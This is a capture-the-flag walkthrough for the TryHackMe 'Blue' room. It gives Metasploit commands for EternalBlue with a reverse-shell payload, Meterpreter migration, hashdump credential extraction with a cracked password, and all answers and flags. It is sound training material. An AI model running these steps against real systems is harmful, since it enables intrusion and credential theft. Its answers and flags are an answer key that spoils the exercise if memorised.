# Blue Walkthrough

A step‑by‑step walkthrough of the Blue (MS17‑010 / EternalBlue) TryHackMe exercise.

---

## 1. Recon

**Scan the machine**  
nmap -sVB -w --script vuln 10.48.176.206

**Q. How many ports open with a port number under 1000?**  
**A.** 3

**Q. What is this machine vulnerable to? (Answer format: ms##-###)**  
**A.** ms17-010

---

## 2. Gain Access

**Find the exploitation module**  
msfconsole  
search type:exploit ms17-010

**Q. What is the full path of the exploit module?**  
**A.** exploit/windows/smb/ms17_010_eternalblue

**Q. Show options and set the one required value. What is the name of this value? (All caps for submission)**  
**A.** RHOSTS

**Example usage (text only):**  
use exploit/windows/smb/ms17_010_eternalblue  
set rhosts 10.48.176.206  
set payload windows/x64/shell/reverse_tcp  
run

Resulting prompt: `C:\Windows\system32>`

---

## 3. Escalate

If you have a shell, background it (CTRL+Z). Convert a shell to a Meterpreter session using the appropriate post module.

**Q. What is the name of the post module used to convert a shell to Meterpreter?**  
**A.** post/multi/manage/shell_to_meterpreter

**Q. After selecting the module and showing options, what option must be changed?**  
**A.** SESSION

**Example steps (text only):**  
use post/multi/manage/shell_to_meterpreter  
show options  
set SESSION 1  
run

List sessions to find the target session: `sessions`  
Interact with session 1: `sessions 1`  
Inside Meterpreter: `ps` → locate NT AUTHORITY/SYSTEM process (e.g., PID 3064)  
Migrate to that process: `migrate 3064`

---

## 4. Cracking

Within an elevated Meterpreter session, run `hashdump` to extract password hashes (requires appropriate privileges).

**Q. What is the name of the non-default user?**  
**A.** Jon

**Password hash (example):**  
ffb43f0de35be4d9917ac0cc8ad57f8d

**Cracked password (example):**  
alqfna22

---

## 5. Flags

**Flag 1 — located at system root**  
- Navigate to C:\  
- `dir` shows `flag1.txt`  
- `type flag1.txt` → **flag{access_the_machine}**

**Flag 2 — located where Windows stores passwords (SAM)**  
- `dir flag2.txt /s` → Location: `C:\Windows\System32\config`  
- `type C:\Windows\System32\config\flag2.txt` → **flag{sam_database_elevated_access}**

**Flag 3 — located in an administrator's documents**  
- `dir flag3.txt /s` → `C:\Users\Jon\Documents\flag3.txt`  
- `type C:\Users\Jon\Documents\flag3.txt` → **flag{admin_documents_can_be_valuable}**

---

## Notes

- This walkthrough documents the high‑level steps and answers observed during the Blue room exercise.  
- Replace example IPs, session IDs, and PIDs with the actual values from your lab environment when reproducing these steps.  
- Always follow legal and ethical guidelines when testing systems.
